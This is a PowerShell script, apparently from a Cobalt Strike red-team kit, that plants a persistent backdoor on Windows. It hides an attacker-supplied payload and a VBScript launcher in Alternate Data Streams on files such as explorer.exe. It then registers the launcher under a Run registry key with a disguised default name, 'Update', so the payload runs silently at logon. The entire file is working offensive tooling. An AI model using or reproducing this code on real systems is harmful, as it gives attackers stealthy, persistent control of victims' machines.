function Invoke-ADSBackdoor{
<#
.SYNOPSIS
Powershell Script that will use Alternate Data Streams to achieve persistence
Author: Matt Nelson (@enigma0x3) 
Modified by Jonathan Echavarria (@Und3rf10w) to work with Cobalt Strike

.DESCRIPTION
This script will obtain persistence on a Windows 7+ machine under both Standard and Administrative accounts by 
using two Alternate Data Streams. The first Alternate Data stream stores the payload and the second Alternate Data Stream 
stores some VBScript that acts as a wrapper in order to hide the DOS prompt when invoking the data stream containing the 
payload. This script is not intented to be used outside the Cobalt Strike Und3rf10w Aggressor Kit workflow as it will
correctly generate all of the correct arguments.

.EXAMPLE
PS C:\> Invoke-ADSBackdoor -admin -RegKeyName Und3rf10w_key -backdoored_file_path C:\Windows\System32\explorer.exe -cobaltstrike_gen_payload <provided by cobalt strike>

#>


    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [string]$cobaltstrike_gen_payload,

        [Parameter(Mandatory=$False)]
        [switch]$admin,
        
        [Parameter(Mandatory=$False)]
        [string]$RegKeyName,

        [Parameter(Mandatory=$False)]
        [string]$backdoored_file_path
    )
    if (!$RegKeyName) {
        Write-Host "Registry key name not provided, defaulting to 'Update'"
        $RegKeyName = "Update"
    }

    if (!$backdoored_file_path) {
        Write-Host "Path to file to backdoor not provided, defaulting to '$env:USERPROFILE\AppData'"
        $backdoored_file_path = "$env:USERPROFILE\AppData"
    }

    if ($admin){
         $keyhive = "HKLM"
    } else {
         $keyhive = "HKCU"
    }

    $backdoored_file_path = [System.Environment]::ExpandEnvironmentVariables($backdoored_file_path)

    $payload = $cobaltstrike_gen_payload
    $payload_adsfile_name = [System.IO.Path]::GetRandomFileName() + ".vbs"
    $wrapper_adsfile_name = [System.IO.Path]::GetRandomFileName() + ".vbs"

    $vbstext1 = "Dim objShell"
    $vbstext2 = "Set objShell = WScript.CreateObject(""WScript.Shell"")"
    $vbstext3 = "command = ""cmd /C for /f """"delims=,"""" %i in ($backdoored_file_path" + ":" + "$payload_adsfile_name) do %i""" #TODO: change the path to a proper variable
    $vbstext4 = "objShell.Run command, 0"
    $vbstext5 = "Set objShell = Nothing"
    $vbText = $vbstext1 + ":" + $vbstext2 + ":" + $vbstext3 + ":" + $vbstext4 + ":" + $vbstext5

    $backADSFile = "$backdoored_file_path" + ":$payload_adsfile_name"
    $wrapADSFile = "$backdoored_file_path" + ":$wrapper_adsfile_name"

    $createPayloadADS = {cmd /C "echo $payload > `"$backADSFile`""}
    $createWrapperADS = {cmd /C "echo $vbtext > `"$wrapADSFile`""}

    Invoke-Command -ScriptBlock $createPayloadADS
    Invoke-Command -ScriptBlock $createWrapperADS
  
    $backCommand = "wscript.exe " + "`"$backdoored_file_path" + ":$wrapper_adsfile_name`""
    New-ItemProperty -Path $keyhive":\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegKeyName -PropertyType String -Value $backCommand -Force
    Write-Host "Backdoor Deployed, details provided below; take notes:"
    Write-Host "Reg key path:" $keyhive":\Software\Microsoft\Windows\CurrentVersion\Run\$RegKeyName"
    Write-Host "Payload path: $backADSFile"
    Write-Host "Wrapper path: $wrapADSFile"
}
